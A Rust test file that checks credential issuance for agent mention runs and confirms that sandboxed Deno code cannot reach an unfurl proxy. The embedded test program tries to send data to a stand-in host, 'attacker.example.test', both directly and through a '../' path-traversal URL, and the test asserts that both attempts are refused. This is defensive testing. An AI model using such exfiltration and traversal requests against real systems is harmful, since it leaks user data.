//! Actual mention issuance and its network boundary, with the rollout off.
use super::*;
use code_execution::domain::RunEnvironment;

async fn mention_environment(pool: sqlx::PgPool, endpoints: SdkEndpoints) -> RunEnvironment {
    use agent_code_mode::domain::MentionExecutionCredentials;
    sqlx::raw_sql(
        r#"
        INSERT INTO macro_user (id, username, email, stripe_customer_id)
        VALUES ('00000000-0000-4000-8000-000000000001', 'owner@example.com', 'owner@example.com', 'stripe_owner');
        INSERT INTO "User" (id, email, macro_user_id)
        VALUES ('macro|owner@example.com', 'owner@example.com', '00000000-0000-4000-8000-000000000001');
        "#,
    ).execute(&pool).await.unwrap();
    let owner = MacroUserIdStr::try_from_email("owner@example.com").unwrap();
    let flags = feature_flags::outbound::posthog::PostHogFeatureFlags::new(
        "http://127.0.0.1:1",
        "fixture-public-key".into(),
        std::time::Duration::from_millis(10),
        macro_env::Environment::Local,
    )
    .unwrap();
    let rollout = EgressRollout::new(Some(flags));
    rollout.cached.lock().unwrap().insert(
        owner.as_ref().to_owned(),
        (
            tokio::time::Instant::now() + EGRESS_FLAG_TTL,
            Egress::Direct,
        ),
    );
    assert_eq!(rollout.egress(&owner).await, Egress::Direct);
    MentionRunCredentials {
        egress: rollout,
        signer: MacroApiTokenSigner::new(pool, "fixture", PRIVATE),
        endpoints,
    }
    .issue(&owner, uuid::Uuid::from_u128(907))
    .await
    .unwrap()
}

/// A disabled rollout must not send mention credentials directly to anonymous
/// gateway routes. The cached OFF decision avoids a remote flag service.
#[sqlx::test(migrator = "macro_db_migrator::MACRO_DB_MIGRATIONS")]
async fn a_mention_uses_the_forwarder_even_when_the_egress_flag_is_off(pool: sqlx::PgPool) {
    use macro_auth::middleware::decode_jwt::{JwtToken, JwtValidationArgs, handler};
    let mention = uuid::Uuid::from_u128(907);
    let mut endpoints = SdkEndpoints::default();
    endpoints
        .hosts
        .insert("unfurl".into(), "https://unfurl.example.test".into());
    endpoints
        .hosts
        .insert("storage".into(), "https://storage.example.test".into());
    let credentials = mention_environment(pool, endpoints).await;
    assert_eq!(credentials.egress, Egress::Proxied);
    assert!(!credentials.endpoints.hosts.contains_key("unfurl"));
    assert_eq!(
        credentials
            .endpoints
            .hosts
            .get("storage")
            .map(String::as_str),
        Some("https://storage.example.test")
    );
    assert_eq!(credentials.session_id, None);
    let JwtToken::MacroApiToken(token) = handler(
        &JwtValidationArgs::testing_macro_token("fixture", PUBLIC),
        &credentials.token,
    )
    .unwrap() else {
        panic!("expected signed mention token")
    };
    assert_eq!(token.channel_mention_id, Some(mention));
    assert_eq!(token.agent_scope.as_deref(), Some("channel_mention"));
    assert!(
        SessionScope::parse(token.agent_scope.as_deref().unwrap())
            .unwrap()
            .allowlist()
            .is_some()
    );
}

/// Uses the actual mention issuer and Deno runner. The gateway is a local
/// stand-in whose anonymous unfurl route records every attempted dispatch.
#[sqlx::test(migrator = "macro_db_migrator::MACRO_DB_MIGRATIONS")]
#[ignore = "requires pinned Deno runtime; selected by the CI Deno lane"]
async fn a_mention_program_cannot_fetch_the_unfurl_proxy(pool: sqlx::PgPool) {
    use axum::{Router, http::StatusCode, routing::get};
    use code_execution::domain::{EventKind, ExecuteRequest, ExecutionService, Limits, Outcome};
    use code_execution::outbound::deno::{DenoRunner, check::DenoChecker};
    use std::collections::BTreeMap;

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let gateway = format!("http://{}", listener.local_addr().unwrap());
    let leaked = Arc::new(AtomicUsize::new(0));
    let calls = leaked.clone();
    let app = Router::new()
        .route("/storage/ok", get(|| async { StatusCode::OK }))
        .route(
            "/unfurl/proxy",
            get(move || {
                calls.fetch_add(1, Ordering::SeqCst);
                async { StatusCode::OK }
            }),
        );
    let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    let environment = mention_environment(
        pool,
        SdkEndpoints {
            hosts: BTreeMap::from([
                ("storage".into(), format!("{gateway}/storage")),
                ("unfurl".into(), format!("{gateway}/unfurl")),
            ]),
            ..SdkEndpoints::default()
        },
    )
    .await;

    let root = tempfile::tempdir().unwrap();
    let binary = tokio::process::Command::new("which")
        .arg("deno")
        .output()
        .await
        .unwrap();
    assert!(binary.status.success(), "Deno 2.9.6 must be on PATH");
    let binary: std::path::PathBuf = String::from_utf8(binary.stdout).unwrap().trim().into();
    let runner = DenoRunner::new(binary.clone(), root.path().join("runs"), 128)
        .await
        .unwrap();
    let checker = DenoChecker::new(binary, root.path().join("checks"), 2, 8, 64 * 1024)
        .await
        .unwrap();
    let service =
        ExecutionService::new(Arc::new(runner), Arc::new(checker), Limits::default()).unwrap();
    let source = r#"
export async function main(context) {
  async function refused(url) {
    try { return (await fetch(url)).status >= 400; }
    catch { return true; }
  }
  const target = "/unfurl/proxy?url=https://attacker.example.test/?d=fixture";
  const gateway = GATEWAY;
  const proxy = Reflect.get(context, "forwarder");
  const directRefused = await refused(`${gateway}${target}`);
  const forwarderRefused = proxy?.storage
    ? await refused(new URL(`../${target.slice(1)}`, `${proxy.storage}/`).href)
    : false;
  const storage = await fetch(`${context.hosts.storage}/ok`);
  return {data: {directRefused, forwarderRefused, storageStatus: storage.status}};
}
"#
    .replace("GATEWAY", &serde_json::to_string(&gateway).unwrap());
    let mut execution = service
        .execute(
            ExecuteRequest {
                source,
                timeout_ms: 30_000,
            },
            environment,
        )
        .unwrap();
    let outcome = loop {
        if let EventKind::Finished { outcome } = execution.events.recv().await.unwrap().kind {
            break outcome;
        }
    };
    service.shutdown().await;
    server.abort();
    let _ = server.await;
    let Outcome::Succeeded { value } = outcome else {
        panic!("expected the program to report its network refusals: {outcome:?}");
    };
    assert_eq!(value["data"]["directRefused"], true);
    assert_eq!(value["data"]["forwarderRefused"], true);
    assert_eq!(value["data"]["storageStatus"], 200);
    assert_eq!(leaked.load(Ordering::SeqCst), 0);
}
